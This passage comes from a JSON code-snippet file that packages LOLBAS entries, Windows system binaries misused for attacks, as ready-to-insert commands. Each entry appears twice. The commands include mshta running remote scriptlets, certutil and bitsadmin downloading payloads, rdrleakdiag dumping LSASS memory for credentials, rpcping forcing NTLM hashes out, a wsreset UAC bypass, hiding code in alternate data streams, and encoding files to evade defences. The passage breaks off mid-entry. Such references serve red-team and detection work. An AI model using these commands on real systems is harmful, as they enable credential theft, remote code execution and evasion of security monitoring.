        "description": "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Download and compress a remote file and store it in a CAB file on local machine., requires  privilege, category: Download, it can be used for Download and compress into a cab file.."
    },
    "Diantz.exe Bypass command-line based detections (lolbas)": {
        "prefix": "Diantz.exe",
        "body": [
            "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification., requires  privilege, category: Execute, it can be used for Bypass command-line based detections.",
            "",
            "```sh",
            "diantz /f {PATH:.ddf}${0}",
            "```"
        ],
        "description": "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification., requires  privilege, category: Execute, it can be used for Bypass command-line based detections."
    },
    "lolbas Diantz.exe Bypass command-line based detections": {
        "prefix": "lolbas Diantz.exe",
        "body": [
            "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification., requires  privilege, category: Execute, it can be used for Bypass command-line based detections.",
            "",
            "```sh",
            "diantz /f {PATH:.ddf}${0}",
            "```"
        ],
        "description": "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification., requires  privilege, category: Execute, it can be used for Bypass command-line based detections."
    },
    "Rpcping.exe Capture credentials on a non-standard port (lolbas)": {
        "prefix": "Rpcping.exe",
        "body": [
            "Rpcping.exe is Used to verify rpc connection. it can Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process., requires  privilege, category: Credentials, it can be used for Capture credentials on a non-standard port.",
            "",
            "```sh",
            "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM${0}",
            "```"
        ],
        "description": "Rpcping.exe is Used to verify rpc connection. it can Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process., requires  privilege, category: Credentials, it can be used for Capture credentials on a non-standard port."
    },
    "lolbas Rpcping.exe Capture credentials on a non-standard port": {
        "prefix": "lolbas Rpcping.exe",
        "body": [
            "Rpcping.exe is Used to verify rpc connection. it can Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process., requires  privilege, category: Credentials, it can be used for Capture credentials on a non-standard port.",
            "",
            "```sh",
            "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM${0}",
            "```"
        ],
        "description": "Rpcping.exe is Used to verify rpc connection. it can Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process., requires  privilege, category: Credentials, it can be used for Capture credentials on a non-standard port."
    },
    "Rpcping.exe Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port (lolbas)": {
        "prefix": "Rpcping.exe",
        "body": [
            "Rpcping.exe is Used to verify rpc connection. it can Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set)., requires  privilege, category: Credentials, it can be used for Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port.",
            "",
            "```sh",
            "rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM${0}",
            "```"
        ],
        "description": "Rpcping.exe is Used to verify rpc connection. it can Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set)., requires  privilege, category: Credentials, it can be used for Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port."
    },
    "lolbas Rpcping.exe Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port": {
        "prefix": "lolbas Rpcping.exe",
        "body": [
            "Rpcping.exe is Used to verify rpc connection. it can Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set)., requires  privilege, category: Credentials, it can be used for Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port.",
            "",
            "```sh",
            "rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM${0}",
            "```"
        ],
        "description": "Rpcping.exe is Used to verify rpc connection. it can Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set)., requires  privilege, category: Credentials, it can be used for Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port."
    },
    "Wsreset.exe Execute a binary or script as a high-integrity process without a UAC prompt. (lolbas)": {
        "prefix": "Wsreset.exe",
        "body": [
            "Wsreset.exe is Used to reset Windows Store settings according to its manifest file. it can During startup, wsreset.exe checks the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt..",
            "",
            "```sh",
            "wsreset.exe${0}",
            "```"
        ],
        "description": "Wsreset.exe is Used to reset Windows Store settings according to its manifest file. it can During startup, wsreset.exe checks the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt.."
    },
    "lolbas Wsreset.exe Execute a binary or script as a high-integrity process without a UAC prompt.": {
        "prefix": "lolbas Wsreset.exe",
        "body": [
            "Wsreset.exe is Used to reset Windows Store settings according to its manifest file. it can During startup, wsreset.exe checks the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt..",
            "",
            "```sh",
            "wsreset.exe${0}",
            "```"
        ],
        "description": "Wsreset.exe is Used to reset Windows Store settings according to its manifest file. it can During startup, wsreset.exe checks the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt.."
    },
    "Ttdinject.exe Spawn process using other binary (lolbas)": {
        "prefix": "Ttdinject.exe",
        "body": [
            "Ttdinject.exe is Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe). it can Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated., requires  privilege, category: Execute, it can be used for Spawn process using other binary.",
            "",
            "```sh",
            "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"{PATH:.exe}\"${0}",
            "```"
        ],
        "description": "Ttdinject.exe is Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe). it can Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated., requires  privilege, category: Execute, it can be used for Spawn process using other binary."
    },
    "lolbas Ttdinject.exe Spawn process using other binary": {
        "prefix": "lolbas Ttdinject.exe",
        "body": [
            "Ttdinject.exe is Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe). it can Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated., requires  privilege, category: Execute, it can be used for Spawn process using other binary.",
            "",
            "```sh",
            "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"{PATH:.exe}\"${0}",
            "```"
        ],
        "description": "Ttdinject.exe is Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe). it can Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated., requires  privilege, category: Execute, it can be used for Spawn process using other binary."
    },
    "Ilasm.exe Compile attacker code on system. Bypass defensive counter measures. (lolbas)": {
        "prefix": "Ilasm.exe",
        "body": [
            "Ilasm.exe is used for compile c# code into dll or exe.. it can Binary file used by .NET to compile C#/intermediate (IL) code to .exe, requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures..",
            "",
            "```sh",
            "ilasm.exe {PATH_ABSOLUTE:.txt} /exe${0}",
            "```"
        ],
        "description": "Ilasm.exe is used for compile c# code into dll or exe.. it can Binary file used by .NET to compile C#/intermediate (IL) code to .exe, requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures.."
    },
    "lolbas Ilasm.exe Compile attacker code on system. Bypass defensive counter measures.": {
        "prefix": "lolbas Ilasm.exe",
        "body": [
            "Ilasm.exe is used for compile c# code into dll or exe.. it can Binary file used by .NET to compile C#/intermediate (IL) code to .exe, requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures..",
            "",
            "```sh",
            "ilasm.exe {PATH_ABSOLUTE:.txt} /exe${0}",
            "```"
        ],
        "description": "Ilasm.exe is used for compile c# code into dll or exe.. it can Binary file used by .NET to compile C#/intermediate (IL) code to .exe, requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures.."
    },
    "Ilasm.exe A description of the usecase (lolbas)": {
        "prefix": "Ilasm.exe",
        "body": [
            "Ilasm.exe is used for compile c# code into dll or exe.. it can Binary file used by .NET to compile C#/intermediate (IL) code to dll, requires  privilege, category: Compile, it can be used for A description of the usecase.",
            "",
            "```sh",
            "ilasm.exe {PATH_ABSOLUTE:.txt} /dll${0}",
            "```"
        ],
        "description": "Ilasm.exe is used for compile c# code into dll or exe.. it can Binary file used by .NET to compile C#/intermediate (IL) code to dll, requires  privilege, category: Compile, it can be used for A description of the usecase."
    },
    "lolbas Ilasm.exe A description of the usecase": {
        "prefix": "lolbas Ilasm.exe",
        "body": [
            "Ilasm.exe is used for compile c# code into dll or exe.. it can Binary file used by .NET to compile C#/intermediate (IL) code to dll, requires  privilege, category: Compile, it can be used for A description of the usecase.",
            "",
            "```sh",
            "ilasm.exe {PATH_ABSOLUTE:.txt} /dll${0}",
            "```"
        ],
        "description": "Ilasm.exe is used for compile c# code into dll or exe.. it can Binary file used by .NET to compile C#/intermediate (IL) code to dll, requires  privilege, category: Compile, it can be used for A description of the usecase."
    },
    "rdrleakdiag.exe Dump process by PID. (lolbas)": {
        "prefix": "rdrleakdiag.exe",
        "body": [
            "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can Dump process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump process by PID..",
            "",
            "```sh",
            "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1${0}",
            "```"
        ],
        "description": "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can Dump process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump process by PID.."
    },
    "lolbas rdrleakdiag.exe Dump process by PID.": {
        "prefix": "lolbas rdrleakdiag.exe",
        "body": [
            "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can Dump process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump process by PID..",
            "",
            "```sh",
            "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1${0}",
            "```"
        ],
        "description": "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can Dump process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump process by PID.."
    },
    "rdrleakdiag.exe Dump LSASS process. (lolbas)": {
        "prefix": "rdrleakdiag.exe",
        "body": [
            "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can Dump LSASS process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump LSASS process..",
            "",
            "```sh",
            "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1${0}",
            "```"
        ],
        "description": "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can Dump LSASS process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump LSASS process.."
    },
    "lolbas rdrleakdiag.exe Dump LSASS process.": {
        "prefix": "lolbas rdrleakdiag.exe",
        "body": [
            "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can Dump LSASS process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump LSASS process..",
            "",
            "```sh",
            "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1${0}",
            "```"
        ],
        "description": "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can Dump LSASS process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump LSASS process.."
    },
    "rdrleakdiag.exe Dump LSASS process mutliple times. (lolbas)": {
        "prefix": "rdrleakdiag.exe",
        "body": [
            "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can After dumping a process using /wait 1, subsequent dumps must use /snap (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump LSASS process mutliple times..",
            "",
            "```sh",
            "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap${0}",
            "```"
        ],
        "description": "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can After dumping a process using /wait 1, subsequent dumps must use /snap (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump LSASS process mutliple times.."
    },
    "lolbas rdrleakdiag.exe Dump LSASS process mutliple times.": {
        "prefix": "lolbas rdrleakdiag.exe",
        "body": [
            "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can After dumping a process using /wait 1, subsequent dumps must use /snap (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump LSASS process mutliple times..",
            "",
            "```sh",
            "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap${0}",
            "```"
        ],
        "description": "rdrleakdiag.exe is Microsoft Windows resource leak diagnostic tool. it can After dumping a process using /wait 1, subsequent dumps must use /snap (Creates files called minidump_<PID>.dmp and results_<PID>.hlk)., requires  privilege, category: Dump, it can be used for Dump LSASS process mutliple times.."
    },
    "Certutil.exe Download file from Internet (lolbas)": {
        "prefix": "Certutil.exe",
        "body": [
            "Certutil.exe is Windows binary used for handling certificates. it can Download and save an executable to %LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\[hash]., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "certutil.exe -URL {REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "Certutil.exe is Windows binary used for handling certificates. it can Download and save an executable to %LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\[hash]., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "lolbas Certutil.exe Download file from Internet": {
        "prefix": "lolbas Certutil.exe",
        "body": [
            "Certutil.exe is Windows binary used for handling certificates. it can Download and save an executable to %LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\[hash]., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "certutil.exe -URL {REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "Certutil.exe is Windows binary used for handling certificates. it can Download and save an executable to %LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\[hash]., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "Certutil.exe Download file from Internet and save it in an NTFS Alternate Data Stream (lolbas)": {
        "prefix": "Certutil.exe",
        "body": [
            "Certutil.exe is Windows binary used for handling certificates. it can Download and save a .ps1 file to an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Download file from Internet and save it in an NTFS Alternate Data Stream.",
            "",
            "```sh",
            "certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt${0}",
            "```"
        ],
        "description": "Certutil.exe is Windows binary used for handling certificates. it can Download and save a .ps1 file to an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Download file from Internet and save it in an NTFS Alternate Data Stream."
    },
    "lolbas Certutil.exe Download file from Internet and save it in an NTFS Alternate Data Stream": {
        "prefix": "lolbas Certutil.exe",
        "body": [
            "Certutil.exe is Windows binary used for handling certificates. it can Download and save a .ps1 file to an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Download file from Internet and save it in an NTFS Alternate Data Stream.",
            "",
            "```sh",
            "certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt${0}",
            "```"
        ],
        "description": "Certutil.exe is Windows binary used for handling certificates. it can Download and save a .ps1 file to an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Download file from Internet and save it in an NTFS Alternate Data Stream."
    },
    "Certutil.exe Encode files to evade defensive measures (lolbas)": {
        "prefix": "Certutil.exe",
        "body": [
            "Certutil.exe is Windows binary used for handling certificates. it can Command to encode a file using Base64, requires  privilege, category: Encode, it can be used for Encode files to evade defensive measures.",
            "",
            "```sh",
            "certutil -encode {PATH} {PATH:.base64}${0}",
            "```"
        ],
        "description": "Certutil.exe is Windows binary used for handling certificates. it can Command to encode a file using Base64, requires  privilege, category: Encode, it can be used for Encode files to evade defensive measures."
    },
    "lolbas Certutil.exe Encode files to evade defensive measures": {
        "prefix": "lolbas Certutil.exe",
        "body": [
            "Certutil.exe is Windows binary used for handling certificates. it can Command to encode a file using Base64, requires  privilege, category: Encode, it can be used for Encode files to evade defensive measures.",
            "",
            "```sh",
            "certutil -encode {PATH} {PATH:.base64}${0}",
            "```"
        ],
        "description": "Certutil.exe is Windows binary used for handling certificates. it can Command to encode a file using Base64, requires  privilege, category: Encode, it can be used for Encode files to evade defensive measures."
    },
    "Certutil.exe Decode files to evade defensive measures (lolbas)": {
        "prefix": "Certutil.exe",
        "body": [
            "Certutil.exe is Windows binary used for handling certificates. it can Command to decode a hexadecimal-encoded file., requires  privilege, category: Decode, it can be used for Decode files to evade defensive measures.",
            "",
            "```sh",
            "certutil -decodehex {PATH:.hex} {PATH}${0}",
            "```"
        ],
        "description": "Certutil.exe is Windows binary used for handling certificates. it can Command to decode a hexadecimal-encoded file., requires  privilege, category: Decode, it can be used for Decode files to evade defensive measures."
    },
    "lolbas Certutil.exe Decode files to evade defensive measures": {
        "prefix": "lolbas Certutil.exe",
        "body": [
            "Certutil.exe is Windows binary used for handling certificates. it can Command to decode a hexadecimal-encoded file., requires  privilege, category: Decode, it can be used for Decode files to evade defensive measures.",
            "",
            "```sh",
            "certutil -decodehex {PATH:.hex} {PATH}${0}",
            "```"
        ],
        "description": "Certutil.exe is Windows binary used for handling certificates. it can Command to decode a hexadecimal-encoded file., requires  privilege, category: Decode, it can be used for Decode files to evade defensive measures."
    },
    "Replace.exe Copy files (lolbas)": {
        "prefix": "Replace.exe",
        "body": [
            "Replace.exe is Used to replace file with another file. it can Copy .cab file to destination, requires  privilege, category: Copy, it can be used for Copy files.",
            "",
            "```sh",
            "replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A${0}",
            "```"
        ],
        "description": "Replace.exe is Used to replace file with another file. it can Copy .cab file to destination, requires  privilege, category: Copy, it can be used for Copy files."
    },
    "lolbas Replace.exe Copy files": {
        "prefix": "lolbas Replace.exe",
        "body": [
            "Replace.exe is Used to replace file with another file. it can Copy .cab file to destination, requires  privilege, category: Copy, it can be used for Copy files.",
            "",
            "```sh",
            "replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A${0}",
            "```"
        ],
        "description": "Replace.exe is Used to replace file with another file. it can Copy .cab file to destination, requires  privilege, category: Copy, it can be used for Copy files."
    },
    "Replace.exe Download file (lolbas)": {
        "prefix": "Replace.exe",
        "body": [
            "Replace.exe is Used to replace file with another file. it can Download/Copy executable to specified folder, requires  privilege, category: Download, it can be used for Download file.",
            "",
            "```sh",
            "replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A${0}",
            "```"
        ],
        "description": "Replace.exe is Used to replace file with another file. it can Download/Copy executable to specified folder, requires  privilege, category: Download, it can be used for Download file."
    },
    "lolbas Replace.exe Download file": {
        "prefix": "lolbas Replace.exe",
        "body": [
            "Replace.exe is Used to replace file with another file. it can Download/Copy executable to specified folder, requires  privilege, category: Download, it can be used for Download file.",
            "",
            "```sh",
            "replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A${0}",
            "```"
        ],
        "description": "Replace.exe is Used to replace file with another file. it can Download/Copy executable to specified folder, requires  privilege, category: Download, it can be used for Download file."
    },
    "Mshta.exe Execute code (lolbas)": {
        "prefix": "Mshta.exe",
        "body": [
            "Mshta.exe is Used by Windows to execute html applications. (.hta). it can Executes JavaScript supplied as a command line argument., requires  privilege, category: Execute, it can be used for Execute code.",
            "",
            "```sh",
            "mshta.exe javascript:a=GetObject(\"script:{REMOTEURL:.sct}\").Exec();close();${0}",
            "```"
        ],
        "description": "Mshta.exe is Used by Windows to execute html applications. (.hta). it can Executes JavaScript supplied as a command line argument., requires  privilege, category: Execute, it can be used for Execute code."
    },
    "lolbas Mshta.exe Execute code": {
        "prefix": "lolbas Mshta.exe",
        "body": [
            "Mshta.exe is Used by Windows to execute html applications. (.hta). it can Executes JavaScript supplied as a command line argument., requires  privilege, category: Execute, it can be used for Execute code.",
            "",
            "```sh",
            "mshta.exe javascript:a=GetObject(\"script:{REMOTEURL:.sct}\").Exec();close();${0}",
            "```"
        ],
        "description": "Mshta.exe is Used by Windows to execute html applications. (.hta). it can Executes JavaScript supplied as a command line argument., requires  privilege, category: Execute, it can be used for Execute code."
    },
    "Mshta.exe Execute code hidden in alternate data stream (lolbas)": {
        "prefix": "Mshta.exe",
        "body": [
            "Mshta.exe is Used by Windows to execute html applications. (.hta). it can Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript., requires  privilege, category: ADS, it can be used for Execute code hidden in alternate data stream.",
            "",
            "```sh",
            "mshta.exe \"{PATH_ABSOLUTE}:file.hta\"${0}",
            "```"
        ],
        "description": "Mshta.exe is Used by Windows to execute html applications. (.hta). it can Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript., requires  privilege, category: ADS, it can be used for Execute code hidden in alternate data stream."
    },
    "lolbas Mshta.exe Execute code hidden in alternate data stream": {
        "prefix": "lolbas Mshta.exe",
        "body": [
            "Mshta.exe is Used by Windows to execute html applications. (.hta). it can Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript., requires  privilege, category: ADS, it can be used for Execute code hidden in alternate data stream.",
            "",
            "```sh",
            "mshta.exe \"{PATH_ABSOLUTE}:file.hta\"${0}",
            "```"
        ],
        "description": "Mshta.exe is Used by Windows to execute html applications. (.hta). it can Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript., requires  privilege, category: ADS, it can be used for Execute code hidden in alternate data stream."
    },
    "Mshta.exe Downloads payload from remote server (lolbas)": {
        "prefix": "Mshta.exe",
        "body": [
            "Mshta.exe is Used by Windows to execute html applications. (.hta). it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server.",
            "",
            "```sh",
            "mshta.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Mshta.exe is Used by Windows to execute html applications. (.hta). it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server."
    },
    "lolbas Mshta.exe Downloads payload from remote server": {
        "prefix": "lolbas Mshta.exe",
        "body": [
            "Mshta.exe is Used by Windows to execute html applications. (.hta). it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server.",
            "",
            "```sh",
            "mshta.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Mshta.exe is Used by Windows to execute html applications. (.hta). it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server."
    },
    "Bitsadmin.exe Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique. (lolbas)": {
        "prefix": "Bitsadmin.exe",
        "body": [
            "Bitsadmin.exe is Used for managing background intelligent transfer. it can Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job., requires  privilege, category: ADS, it can be used for Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique..",
            "",
            "```sh",
            "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1${0}",
            "```"
        ],
        "description": "Bitsadmin.exe is Used for managing background intelligent transfer. it can Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job., requires  privilege, category: ADS, it can be used for Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.."
    },
    "lolbas Bitsadmin.exe Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.": {
        "prefix": "lolbas Bitsadmin.exe",
        "body": [
            "Bitsadmin.exe is Used for managing background intelligent transfer. it can Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job., requires  privilege, category: ADS, it can be used for Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique..",
            "",
            "```sh",
            "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1${0}",
            "```"
        ],
        "description": "Bitsadmin.exe is Used for managing background intelligent transfer. it can Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job., requires  privilege, category: ADS, it can be used for Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.."
    },
    "Bitsadmin.exe Download file from Internet (lolbas)": {
        "prefix": "Bitsadmin.exe",
        "body": [
            "Bitsadmin.exe is Used for managing background intelligent transfer. it can Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1${0}",
            "```"
        ],
        "description": "Bitsadmin.exe is Used for managing background intelligent transfer. it can Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "lolbas Bitsadmin.exe Download file from Internet": {
        "prefix": "lolbas Bitsadmin.exe",
        "body": [
            "Bitsadmin.exe is Used for managing background intelligent transfer. it can Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1${0}",
            "```"
        ],
        "description": "Bitsadmin.exe is Used for managing background intelligent transfer. it can Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "Bitsadmin.exe Copy file (lolbas)": {
        "prefix": "Bitsadmin.exe",
        "body": [
            "Bitsadmin.exe is Used for managing background intelligent transfer. it can Command for copying cmd.exe to another folder, requires  privilege, category: Copy, it can be used for Copy file.",
            "",
            "```sh",
            "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset${0}",
            "```"
        ],
        "description": "Bitsadmin.exe is Used for managing background intelligent transfer. it can Command for copying cmd.exe to another folder, requires  privilege, category: Copy, it can be used for Copy file."
    },
    "lolbas Bitsadmin.exe Copy file": {
        "prefix": "lolbas Bitsadmin.exe",
        "body": [
            "Bitsadmin.exe is Used for managing background intelligent transfer. it can Command for copying cmd.exe to another folder, requires  privilege, category: Copy, it can be used for Copy file.",
            "",
            "```sh",
            "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset${0}",
            "```"
        ],
        "description": "Bitsadmin.exe is Used for managing background intelligent transfer. it can Command for copying cmd.exe to another folder, requires  privilege, category: Copy, it can be used for Copy file."
    },
    "Bitsadmin.exe Execute binary file specified. Can be used as a defensive evasion. (lolbas)": {
        "prefix": "Bitsadmin.exe",
        "body": [
            "Bitsadmin.exe is Used for managing background intelligent transfer. it can One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job., requires  privilege, category: Execute, it can be used for Execute binary file specified. Can be used as a defensive evasion..",
            "",
            "```sh",
